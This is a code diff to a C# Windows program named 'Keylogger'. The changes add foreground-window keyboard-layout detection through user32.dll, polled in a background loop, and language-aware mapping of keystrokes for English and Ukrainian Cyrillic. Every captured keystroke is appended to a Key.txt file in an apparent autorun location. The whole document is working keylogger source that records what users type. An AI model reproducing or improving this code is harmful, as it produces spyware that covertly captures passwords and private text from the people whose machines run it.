@@ -10,8 +10,8 @@ using System.Windows.Interop;
 using System.Windows.Threading;
 using System.Linq;
 using System.Globalization;
-
-
+using System.Threading;
+using System.Threading.Tasks;
 
 
 namespace Keylogger
@@ -33,9 +33,37 @@ namespace Keylogger
         #endregion
 
         DispatcherTimer timer = new DispatcherTimer();
-       
+
         //Keylog keylog = new Keylog();
 
+        #region Language
+
+        [DllImport("user32.dll")]
+        static extern IntPtr GetKeyboardLayout(uint idThread);
+        [DllImport("user32.dll")]
+        private static extern IntPtr GetForegroundWindow();
+        [DllImport("user32.dll")]
+        static extern uint GetWindowThreadProcessId(IntPtr hWnd, IntPtr processId);
+
+        private CultureInfo _currentLanaguge;
+
+        private static CultureInfo GetCurrentCulture()
+        {
+            var l = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero));
+            return new CultureInfo((short)l.ToInt64());
+        }
+
+        private void HandleCurrentLanguage()
+        {
+            var currentCulture = GetCurrentCulture();
+            if (_currentLanaguge == null || _currentLanaguge.LCID != currentCulture.LCID)
+            {
+                _currentLanaguge = currentCulture;
+               // MessageBox.Show(_currentLanaguge.Name);
+            }
+        }
+
+        #endregion
 
         public MainWindow()
         {
@@ -46,9 +74,20 @@ namespace Keylogger
             timer.Tick += new EventHandler(timer_tick);
             timer.Interval = new TimeSpan(0,0,1);
             timer.Start();
-            
+
+            Task.Factory.StartNew(() =>
+            {
+                while (true)
+                {
+                    HandleCurrentLanguage();
+                    Thread.Sleep(500);
+                }
+            });
+
 
         }
+
+       
 
         #region KEY_WRITE
 
@@ -61,8 +100,7 @@ namespace Keylogger
         char[] UKey = new char[]{
             '0','1', '2', '3', '4', '5', '6', '7', '8', '9', '\'', 'Х', 'Ї','Ж','Є','Б','Ю','.',
             'Й', 'Ц', 'У', 'К', 'Е', 'Н', 'Г', 'Ш', 'Щ', 'З','Ф', 'І', 'В', 'А', 'П',
-            'Р', 'О', 'Л', 'Д', 'Я', 'Ч', 'С', 'М', 'И', 'Т', 'Ь'
-            };
+            'Р', 'О', 'Л', 'Д', 'Я', 'Ч', 'С', 'М', 'И', 'Т', 'Ь'};
 
         char[] EKey = new char[]
         {
@@ -139,13 +177,13 @@ namespace Keylogger
             //StreamWriter SW = new StreamWriter(AutoRun.Path() + "Key.txt", true);
             
             bool nonNumberEntered = false;
-            string ilm = InputLanguageManager.Current.CurrentInputLanguage.ToString();
+            
             //System.Windows.Forms.InputLanguage myCurrentLanguage = System.Windows.Forms.InputLanguage.CurrentInputLanguage;
             //string ilm = myCurrentLanguage.LayoutName;
             //Process curProcess = new Process();
             //ProcessModule curModule = curProcess.MainModule;
-            
-            //MessageBox.Show(curProcess.MainWindowTitle);
+
+            //MessageBox.Show(ilm);
 
             using (StreamWriter SW = new StreamWriter(AutoRun.Path() + "Key.txt", true))
             {
@@ -154,13 +192,18 @@ namespace Keylogger
                     SW.WriteLine();
                     nextline = 0;
                 }
-
+                
+                #region KEYS
+                
                 if (!keys.Contains(e.KeyCode))
                 {
                     if (e.KeyCode == System.Windows.Forms.Keys.Space)
                         SW.Write(" ");
-                    if(e.KeyCode == System.Windows.Forms.Keys.Return)
+                    if (e.KeyCode == System.Windows.Forms.Keys.Return)
+                    {
                         SW.WriteLine();
+                        nextline = -1;
+                    }
                     if(e.KeyCode == System.Windows.Forms.Keys.Multiply)
                         SW.Write("*");
                     if (e.KeyCode == System.Windows.Forms.Keys.Divide)
@@ -193,15 +236,20 @@ namespace Keylogger
                         SW.Write("+");
                     if (e.KeyCode == System.Windows.Forms.Keys.Subtract)
                         SW.Write("-");
-                    else SW.Write("");
+                    else
+                    {
+                        SW.Write("");
+                        nextline--;
+                    }
                     nextline++;
                     
 
                 }
-                
+                #endregion
+
                 else
                 {
-                    switch (ilm)
+                    switch (_currentLanaguge.Name)
                     {
                         case "en-US":
                             try
@@ -238,6 +286,7 @@ namespace Keylogger
                                 MessageBox.Show(ex.ToString());
                             }
                             break;
+                        
                         default:
                             SW.Write(e.KeyCode);
                             break;
